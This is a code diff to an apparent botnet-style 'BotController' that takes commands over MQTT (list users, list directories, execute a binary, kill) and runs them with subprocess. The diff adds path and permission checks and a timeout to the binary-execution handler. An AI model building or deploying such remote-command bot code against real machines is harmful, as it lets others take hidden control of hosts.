@@ -1,5 +1,4 @@
 import paho.mqtt.client as mqtt
-import base64
 from globvars import DEFAULT_BROKER_ADDRESS, DEFAULT_PORT, DEFAULT_TOPIC, CMD_TYPES, RESP_TYPES, ROOT_SECRET, SALT
 from datetime import datetime
 from cryptography.hazmat.primitives import hashes
@@ -7,6 +6,7 @@ from cryptography.hazmat.primitives.kdf.argon2 import Argon2id
 from protocol import ProtocolHandler
 import subprocess
 import time
+import os
 
 class BotController:
     '''
@@ -46,7 +46,7 @@ class BotController:
 
     def command_to_type(self, args) -> tuple[int, bytes]:
         if args.announce:
-            return CMD_TYPES["announce"], args.announce.encode()
+            return CMD_TYPES["announce"], b"" 
         if args.list_users:
             return CMD_TYPES["list_users"], b""
         if args.list_dir:
@@ -104,14 +104,44 @@ class BotController:
             return RESP_TYPES["error"], subp_command.stderr
         return RESP_TYPES["ok"], subp_command.stdout
 
-    def handle_exec_binary(self, payload: bytes):
-        path = payload.decode()
-        command = f"{path}"
-        subp_command = subprocess.run(command, capture_output=True)
+    def _is_executable(self, path: str) -> tuple[bool, bytes]:
+        if not os.path.exists(path):
+            return False, b"File does not exist"
 
-        if subp_command.returncode != 0:
-            return RESP_TYPES["error"], subp_command.stderr
-        return RESP_TYPES["ok"], subp_command.stdout
+        if not os.path.isfile(path):
+            return False, b"Not a regular file"
+
+        if not os.access(path, os.X_OK):
+            return False, b"Permission denied (not executable)"
+
+        return True, b""
+
+    def handle_exec_binary(self, payload: bytes):
+        path = payload.decode().strip()
+
+        ok, err = self._is_executable(path)
+        if not ok:
+            return RESP_TYPES["error"], err
+
+        try:
+            result = subprocess.run(
+                [path],                 
+                capture_output=True,
+                text=False,             
+                timeout=10              
+            )
+
+            if result.returncode != 0:
+                return RESP_TYPES["error"], result.stderr or b"Execution failed"
+
+            return RESP_TYPES["ok"], result.stdout
+
+        except subprocess.TimeoutExpired:
+            return RESP_TYPES["error"], b"Execution timed out"
+
+        except Exception as e:
+            return RESP_TYPES["error"], str(e).encode()
+
 
     def handle_kill(self, payload: bytes):
         # return value for keep alive boolean variable
